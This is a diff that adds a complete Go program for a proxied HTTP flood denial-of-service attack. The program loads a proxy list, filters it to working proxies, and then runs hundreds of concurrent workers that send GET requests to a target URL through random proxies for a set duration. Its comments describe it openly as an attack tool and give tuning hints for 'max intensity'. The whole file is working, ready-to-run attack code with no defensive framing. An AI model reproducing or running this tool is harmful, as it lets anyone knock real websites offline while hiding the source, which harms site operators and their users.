@@ -1,0 +1,367 @@
+package main
+
+import (
+	"bufio"
+	"context"
+	"crypto/tls"
+	"flag"
+	"fmt"
+	"log"
+	"math/rand"
+	"net"
+	"net/http"
+	"net/url"
+	"os"
+	"os/signal"
+	"strings"
+	"sync"
+	"syscall"
+	"time"
+)
+
+const (
+	// Default target for checking proxies. Google's generate_204 is fast and reliable.
+	defaultProxyCheckTarget = "https://www.google.com/generate_204"
+	// Timeout for checking a single proxy
+	proxyCheckTimeout = 5 * time.Second
+	// Timeout for attack requests via proxy
+	attackRequestTimeout = 8 * time.Second
+)
+
+// --- Main Function ---
+func main() {
+	// --- Command Line Flags ---
+	targetURLFlag := flag.String("target", "", "Target URL (Required, e.g., http://example.com or https://example.com:443)")
+	proxyFileFlag := flag.String("proxies", "", "Path to proxy list file (Required, one proxy per line like http://ip:port or socks5://user:pass@ip:port)")
+	numWorkersFlag := flag.Int("workers", 500, "Number of concurrent attack workers (Goroutines)")
+	durationFlag := flag.Duration("duration", 60*time.Second, "Duration of the attack (e.g., 30s, 1m, 2h)")
+	proxyCheckTargetFlag := flag.String("proxycheck", defaultProxyCheckTarget, "URL to use for checking proxy validity")
+	skipProxyCheckFlag := flag.Bool("skipcheck", false, "Skip the proxy checking phase (use all proxies)")
+
+	flag.Parse()
+	rand.Seed(time.Now().UnixNano()) // Seed random number generator
+
+	// --- Input Validation ---
+	if *targetURLFlag == "" {
+		log.Fatal("Error: Target URL (-target) is required.")
+	}
+	targetURL, err := url.Parse(*targetURLFlag)
+	if err != nil || (targetURL.Scheme != "http" && targetURL.Scheme != "https") {
+		log.Fatalf("Error: Invalid target URL '%s'. Must start with http:// or https://", *targetURLFlag)
+	}
+	if *proxyFileFlag == "" {
+		log.Fatal("Error: Proxy file path (-proxies) is required.")
+	}
+	if *numWorkersFlag <= 0 {
+		log.Fatal("Error: Number of workers must be positive.")
+	}
+
+	// --- Load Proxies ---
+	log.Printf("Loading proxies from %s...", *proxyFileFlag)
+	loadedProxies, err := loadProxies(*proxyFileFlag)
+	if err != nil {
+		log.Fatalf("Error loading proxies: %v", err)
+	}
+	if len(loadedProxies) == 0 {
+		log.Fatal("Error: No proxies loaded from file.")
+	}
+	log.Printf("Loaded %d proxies.", len(loadedProxies))
+
+	// --- Check Proxies (Optional) ---
+	var workingProxies []*url.URL
+	if !*skipProxyCheckFlag {
+		log.Printf("Checking proxies against %s (this may take a while)...", *proxyCheckTargetFlag)
+		workingProxies = checkProxies(loadedProxies, *proxyCheckTargetFlag)
+		log.Printf("Found %d working proxies.", len(workingProxies))
+		if len(workingProxies) == 0 {
+			log.Fatal("Error: No working proxies found after checking. Cannot proceed.")
+		}
+	} else {
+		log.Println("Skipping proxy check as requested.")
+		workingProxies = loadedProxies // Use all loaded proxies
+	}
+
+
+	// --- Setup Context for Duration and Graceful Shutdown ---
+	mainCtx, cancelMain := context.WithCancel(context.Background())
+	attackCtx, cancelAttack := context.WithTimeout(mainCtx, *durationFlag)
+	defer cancelAttack() // Ensure attack context resources are released
+
+	// Handle Ctrl+C (SIGINT) and SIGTERM for graceful shutdown
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+
+	go func() {
+		sig := <-sigChan // Wait for signal
+		log.Printf("Shutdown signal received (%v), stopping workers...", sig)
+		cancelMain()   // Cancel the main context, which cancels attackCtx too
+		cancelAttack() // Also cancel the attack context explicitly
+	}()
+
+	// --- Start Attack Workers ---
+	var wg sync.WaitGroup
+	log.Printf("Starting attack on %s with %d workers using %d proxies for %s...",
+		targetURL.String(), *numWorkersFlag, len(workingProxies), *durationFlag)
+
+	for i := 0; i < *numWorkersFlag; i++ {
+		wg.Add(1)
+		// Launch worker goroutine
+		go attackWorker(attackCtx, &wg, targetURL, workingProxies, i)
+	}
+
+	// --- Wait for Attack to Finish ---
+	<-attackCtx.Done() // Block until the attack duration expires or a signal is received
+
+	if err := attackCtx.Err(); err == context.DeadlineExceeded {
+		log.Println("Attack duration finished.")
+	} else if err == context.Canceled {
+        // Already logged by the signal handler or potentially other cancellations
+        // log.Println("Attack cancelled.")
+	}
+
+	// Ensure main context is cancelled if timeout occurred first
+	cancelMain()
+
+	log.Println("Waiting for workers to stop gracefully...")
+	wg.Wait() // Wait for all attackWorker goroutines to finish
+
+	log.Println("All workers finished. Exiting.")
+}
+
+// --- Proxy Loading Function ---
+func loadProxies(filePath string) ([]*url.URL, error) {
+	file, err := os.Open(filePath)
+	if err != nil {
+		return nil, fmt.Errorf("failed to open proxy file: %w", err)
+	}
+	defer file.Close()
+
+	var proxies []*url.URL
+	scanner := bufio.NewScanner(file)
+	lineNumber := 0
+	for scanner.Scan() {
+		lineNumber++
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" || strings.HasPrefix(line, "#") { // Skip empty lines and comments
+			continue
+		}
+
+		// Ensure scheme is present for url.Parse, default to http if missing
+		if !strings.Contains(line, "://") {
+			line = "http://" + line // Assume http if not specified
+		}
+
+
+		proxyURL, err := url.Parse(line)
+		if err != nil {
+			log.Printf("Warning: Skipping invalid proxy URL on line %d ('%s'): %v", lineNumber, line, err)
+			continue
+		}
+
+		// Basic validation for supported schemes (standard library handles http, https)
+        // SOCKS requires external library, we'll skip check for now, but load them
+		switch proxyURL.Scheme {
+		case "http", "https": // Add "socks5", "socks4" if using a library like golang.org/x/net/proxy
+			proxies = append(proxies, proxyURL)
+		default:
+			log.Printf("Warning: Skipping unsupported proxy scheme on line %d: %s", lineNumber, proxyURL.Scheme)
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		return nil, fmt.Errorf("error reading proxy file: %w", err)
+	}
+
+	return proxies, nil
+}
+
+// --- Proxy Checking Functions ---
+
+// checkProxies concurrently checks a list of proxies.
+func checkProxies(proxies []*url.URL, checkTarget string) []*url.URL {
+	var workingProxies []*url.URL
+	var wg sync.WaitGroup
+	var mutex sync.Mutex // To safely append to workingProxies
+
+	// Limit concurrency to avoid overwhelming the system or the check target
+	concurrencyLimit := 100 // Adjust as needed
+	sem := make(chan struct{}, concurrencyLimit)
+
+	for _, proxyURL := range proxies {
+		wg.Add(1)
+		sem <- struct{}{} // Acquire semaphore slot
+		go func(p *url.URL) {
+			defer wg.Done()
+			defer func() { <-sem }() // Release semaphore slot
+
+			// Use a context with timeout for the check
+			checkCtx, cancel := context.WithTimeout(context.Background(), proxyCheckTimeout)
+			defer cancel()
+
+			if isProxyWorking(checkCtx, p, checkTarget) {
+				mutex.Lock()
+				workingProxies = append(workingProxies, p)
+				// Optional: Log working proxy immediately
+				// log.Printf("Proxy OK: %s", p.String())
+				mutex.Unlock()
+			} else {
+				// Optional: Log failed proxy
+				// log.Printf("Proxy FAILED: %s", p.String())
+			}
+		}(proxyURL)
+	}
+
+	wg.Wait() // Wait for all checks to complete
+	return workingProxies
+}
+
+// isProxyWorking checks if a single proxy can reach the target URL.
+func isProxyWorking(ctx context.Context, proxyURL *url.URL, checkTarget string) bool {
+	// Configure transport to use the specific proxy
+	transport := &http.Transport{
+		Proxy: http.ProxyURL(proxyURL),
+		// Use DialContext for timeout on establishing the connection *through the proxy*
+		DialContext: (&net.Dialer{
+			Timeout:   proxyCheckTimeout, // Connection timeout
+			KeepAlive: 0,                 // Disable keep-alive for checks
+		}).DialContext,
+		TLSHandshakeTimeout: proxyCheckTimeout,       // TLS handshake timeout
+		ExpectContinueTimeout: 1 * time.Second,
+		ResponseHeaderTimeout: proxyCheckTimeout,     // Timeout waiting for headers
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // Allow self-signed certs on check target/proxy
+		DisableKeepAlives: true, // Don't reuse connections for checks
+	}
+
+	// Create a client specifically for this check
+	client := &http.Client{
+		Transport: transport,
+		Timeout:   proxyCheckTimeout, // Overall timeout for the request
+	}
+
+	req, err := http.NewRequestWithContext(ctx, "GET", checkTarget, nil)
+	if err != nil {
+		// log.Printf("Check Error (Req Create) %s: %v", proxyURL, err)
+		return false
+	}
+	// Set a common user agent
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")
+
+
+	resp, err := client.Do(req)
+	if err != nil {
+		// Log detailed error during check phase? Optional.
+		// log.Printf("Check Error (Do) %s: %v", proxyURL, err)
+		return false
+	}
+	defer resp.Body.Close()
+
+	// For generate_204, we expect 204. For others, usually 2xx or 3xx.
+	// Be lenient here, success means we got *some* valid HTTP response through the proxy.
+	return resp.StatusCode >= 200 && resp.StatusCode < 400
+}
+
+
+// --- Attack Worker Function ---
+func attackWorker(ctx context.Context, wg *sync.WaitGroup, targetURL *url.URL, proxies []*url.URL, workerID int) {
+	defer wg.Done()
+
+	if len(proxies) == 0 {
+		log.Printf("Worker %d exiting: No proxies available.", workerID)
+		return
+	}
+
+	// Create a reusable transport template (configure once per worker)
+	// We will create clients per request or reuse a client with careful Transport.Proxy update
+	baseTransport := &http.Transport{
+		// Use DialContext for attack phase timeouts
+		DialContext: (&net.Dialer{
+			Timeout:   attackRequestTimeout,
+			KeepAlive: 30 * time.Second, // Allow keep-alive during attack
+		}).DialContext,
+		TLSHandshakeTimeout:   attackRequestTimeout,
+		ResponseHeaderTimeout: attackRequestTimeout,
+		MaxIdleConns:          10, // Limit idle connections per worker
+		MaxIdleConnsPerHost:   5,
+		IdleConnTimeout:       60 * time.Second,
+		ExpectContinueTimeout: 1 * time.Second,
+		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true}, // Essential for many targets
+		DisableKeepAlives:	   false, // Keep-alive can increase pressure sometimes
+	}
+
+	client := &http.Client{
+		Transport: baseTransport,
+		Timeout:   attackRequestTimeout + 2*time.Second, // Slightly larger client timeout
+	}
+
+	proxyCount := len(proxies)
+	targetStr := targetURL.String()
+
+	for {
+		select {
+		case <-ctx.Done():
+			// Context cancelled (timeout reached or interrupt signal)
+			return // Exit the loop
+		default:
+			// Select a proxy for this request (round-robin based on worker ID and loop iteration is complex, let's do random)
+			proxy := proxies[rand.Intn(proxyCount)] // Simple random selection
+
+
+			// --- Create request context with timeout ---
+			reqCtx, cancelReq := context.WithTimeout(ctx, attackRequestTimeout)
+
+
+			// --- Configure client/transport for THIS proxy ---
+			// Method 1: Create a new client per request (simpler, potentially less efficient)
+			// transportCopy := baseTransport.Clone() // Requires Go 1.13+
+			// transportCopy.Proxy = http.ProxyURL(proxy)
+			// currentClient := &http.Client{Transport: transportCopy, Timeout: attackRequestTimeout + 2*time.Second}
+
+			// Method 2: Modify the shared transport's proxy function (more complex, needs care)
+			// Requires locking if transport is shared across workers, but here it's per-worker.
+            // For per-worker transport, this is safe.
+            baseTransport.Proxy = http.ProxyURL(proxy)
+
+
+			// --- Create the request ---
+			// Create a *new* request object for each attempt to avoid race conditions on headers etc.
+			req, err := http.NewRequestWithContext(reqCtx, "GET", targetStr, nil)
+			if err != nil {
+				// log.Printf("Worker %d: Error creating request for %s: %v", workerID, targetStr, err)
+				cancelReq()
+				continue // Try next iteration
+			}
+
+			// Add randomized or fixed headers
+			req.Header.Set("User-Agent", fmt.Sprintf("GoDoserWorker/%d", rand.Intn(1000))) // Example random UA
+			req.Header.Set("Accept", "*/*")
+			req.Header.Set("Cache-Control", "no-cache")
+            // Add more headers if needed (Referer, Accept-Language, etc.)
+            // req.Header.Set("Referer", fmt.Sprintf("http://search.google.com/?q=%d", rand.Intn(10000)))
+
+
+			// --- Send the request ---
+			resp, err := client.Do(req) // Use the client configured with the proxy
+			if err != nil {
+				// In a real flood, errors (especially timeouts) are expected and often ignored.
+				// Logging them can slow down the attack. Only log if debugging.
+				// log.Printf("Worker %d via %s: Error sending request to %s: %v", workerID, proxy.Host, targetStr, err)
+				cancelReq() // Cancel context if request failed
+				continue    // Try next request
+			}
+
+			// --- IMPORTANT: Consume and close body ---
+			// Even if you don't need the data, reading a bit and closing prevents resource leaks (connections)
+			// In high-intensity floods, sometimes even this is skipped, but it's risky.
+			// io.Copy(io.Discard, io.LimitReader(resp.Body, 512)) // Read a small amount
+			resp.Body.Close()
+
+			// Request sent successfully (even if target returned 4xx/5xx)
+			// log.Printf("Worker %d via %s: Sent request to %s - Status: %s", workerID, proxy.Host, targetStr, resp.Status)
+
+			cancelReq() // Explicitly cancel request context (good practice)
+
+			// Optional small delay - remove for max intensity, add if overwhelming local machine
+			// time.Sleep(1 * time.Millisecond)
+		}
+	}
+}
